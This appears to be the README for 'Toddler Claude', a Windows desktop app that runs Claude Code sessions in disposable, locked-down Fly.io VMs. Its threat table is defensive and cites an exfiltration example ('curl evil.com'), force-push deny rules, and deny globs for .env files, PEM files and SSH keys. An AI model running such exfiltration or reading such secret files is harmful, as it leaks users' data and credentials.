# Toddler Claude

One-click ephemeral remote Claude Code sessions for people you wouldn't trust with a shell.

**What it does:** spins up a disposable Fly.io VM, boots Claude Code inside it using the user's Claude Pro/Max subscription (no API billing), clones a GitHub repo to a fresh feature branch, and streams the terminal into a native Windows desktop app. When the user clicks "Stop", the VM is destroyed. Idle more than 15 min? Also destroyed. Running more than 2 hours? Also destroyed.

**Target user:** someone who doesn't know what a terminal is. They click one green button and talk to Claude. They never see SSH, Docker, cloud consoles, or secrets.

## How it's locked down

| Threat | Mitigation |
|---|---|
| User leaks Claude token | Token lives in Windows Credential Manager; passed to VM only as env var; never written to remote disk; VM destroyed after session |
| User force-pushes `main` | Claude settings deny `git push -f` / `git push main`; branch protection on repo requires PR + CODEOWNERS review |
| User exfiltrates data via `curl evil.com` | nftables egress allowlist on the VM; only Anthropic/GitHub/package registries reachable |
| User deletes the repo | GitHub fine-grained PAT scoped to one repo, `contents:write` + `pull-requests:write` only. No admin |
| User reads `.env` / SSH keys | Claude settings deny globs for `.env*`, `*.pem`, `id_rsa*`, etc.; VM has no such files to begin with |
| User escalates to root on VM | Runs as non-root `dev` user; sudo limited to `nft` for firewall |
| User breaks the DB | Postgres runs in `tmpfs`; wiped on every boot; no prod DB credentials anywhere |
| User runs wild with your Fly account | Hard time limit (2h), idle limit (15min), VM auto-destroyed on stop; single-session lock in the app |
| Subscription abuse | One concurrent session per Claude account (subscription limit); app enforces single-session lock |

## Components

```
toddler-claude/
├── src-tauri/          Rust backend (Tauri v2)
├── src/                React frontend (xterm.js terminal)
├── remote/             Dockerfile + boot scripts for the Fly.io VM image
├── template/           Drop-in .claude/ and .github/ files for target repos
├── .github/workflows/  CI: builds Windows MSI + publishes Docker image
└── docs/               SETUP.md, SECURITY.md, TODDLER_QUICKSTART.md
```

## Quickstart

1. **Install** — download the latest `Toddler-Claude-Setup.msi` from [Releases](https://github.com/WaltherMuurmans/toddler-claude/releases) and run it.
2. **Configure** — first launch walks through four steps: Claude token, GitHub, Fly.io, pick repo.
3. **Use** — click the big green "Start working" button. A remote machine boots in ~20s, Claude appears, you type what you want.
4. **Done** — click "Stop and discard". Machine is deleted.

Full setup with screenshots: [docs/SETUP.md](docs/SETUP.md).

## Building from source

Prerequisites: Node 20+, Rust stable, WebView2 (preinstalled on Windows 11).

```bash
npm install
npm run tauri dev       # hot-reload dev mode
npm run tauri build     # produces MSI + NSIS installer in src-tauri/target/release/bundle/
```

## License

MIT — see [LICENSE](LICENSE).
